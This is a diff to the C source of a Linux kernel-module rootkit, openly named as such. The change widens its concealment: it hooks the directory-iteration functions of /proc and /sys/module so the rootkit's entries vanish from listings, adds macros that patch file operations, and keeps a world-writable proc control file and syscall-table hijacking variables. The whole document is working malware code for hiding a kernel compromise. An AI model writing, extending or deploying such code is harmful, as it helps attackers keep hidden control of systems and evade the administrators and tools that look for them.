@@ -18,9 +18,12 @@ static struct list_head *module_list;
 static struct proc_dir_entry *proc_rootkit;
 
 // Vars for proc manipulation
-int (*orig_iterate_shared)(struct file *, struct dir_context *);
+int (*orig_proc_iterate_shared)(struct file *, struct dir_context *);
+int (*orig_sys_iterate_shared)(struct file *, struct dir_context *);
 int (*orig_filldir)(struct dir_context *, const char *, int, loff_t, u64,
                     unsigned);
+int (*orig_sys_filldir)(struct dir_context *, const char *, int, loff_t, u64,
+                        unsigned);
 
 // Vars for syscall hijacking
 static unsigned long *syscall_table;
@@ -112,19 +115,34 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
     return count;
 }
 
-static int rk_filldir(struct dir_context *ctx, const char *proc_name, int len,
-                      loff_t off, u64 ino, unsigned int d_type)
+static int rk_proc_filldir(struct dir_context *ctx, const char *proc_name, int len,
+                           loff_t off, u64 ino, unsigned int d_type)
 {
     if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
         return 0;
     return orig_filldir(ctx, proc_name, len, off, ino, d_type);
 }
 
-int rk_iterate_shared(struct file *file, struct dir_context *ctx)
+static int rk_sys_filldir(struct dir_context *ctx, const char *proc_name, int len,
+                          loff_t off, u64 ino, unsigned int d_type)
+{
+    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
+        return 0;
+    return orig_sys_filldir(ctx, proc_name, len, off, ino, d_type);
+}
+
+int rk_proc_iterate_shared(struct file *file, struct dir_context *ctx)
 {
     orig_filldir = ctx->actor;
-    *(filldir_t *)&ctx->actor = rk_filldir;
-    return orig_iterate_shared(file, ctx);
+    *(filldir_t *)&ctx->actor = rk_proc_filldir;
+    return orig_proc_iterate_shared(file, ctx);
+}
+
+int rk_sys_iterate_shared(struct file *file, struct dir_context *ctx)
+{
+    orig_sys_filldir = ctx->actor;
+    *(filldir_t *)&ctx->actor = rk_sys_filldir;
+    return orig_sys_iterate_shared(file, ctx);
 }
 
 static const struct file_operations proc_rootkit_fops = {
@@ -134,43 +152,29 @@ static const struct file_operations proc_rootkit_fops = {
 
 static int proc_init(void)
 {
-    struct inode *proc_inode;
-    struct path proc_path;
-
     // Create entry for controlling rootkit
     proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUGO, NULL, &proc_rootkit_fops);
     if (!proc_rootkit)
         return -1;
 
-    if (kern_path("/proc", 0, &proc_path))
-        return -1;
-
-    proc_inode = proc_path.dentry->d_inode; // Get inode of proc
-    orig_iterate_shared = proc_inode->i_fop->iterate_shared;
-    disable_write_protect();
-    ((struct file_operations *)proc_inode->i_fop)->iterate_shared = rk_iterate_shared;
-    enable_write_protect();
+    SET_FOP(iterate_shared, "/proc", rk_proc_iterate_shared, orig_proc_iterate_shared);
+    SET_FOP(iterate_shared, "/sys/module", rk_sys_iterate_shared, orig_sys_iterate_shared);
 
     return 0;
 }
 
-static void proc_clean(void)
+static int proc_clean(void)
 {
-    struct inode *proc_inode;
-    struct path proc_path;
-
     if (proc_rootkit != NULL)
     {
         proc_remove(proc_rootkit);
         proc_rootkit = NULL;
     }
 
-    if (kern_path("/proc", 0, &proc_path))
-        return;
-    proc_inode = proc_path.dentry->d_inode;
-    disable_write_protect();
-    ((struct file_operations *)proc_inode->i_fop)->iterate_shared = orig_iterate_shared;
-    enable_write_protect();
+    UNSET_FOP(iterate_shared, "/proc", orig_proc_iterate_shared);
+    UNSET_FOP(iterate_shared, "/sys/module", orig_sys_iterate_shared);
+
+    return 0;
 }
 
 static int __init lkm_rootkit_init(void)
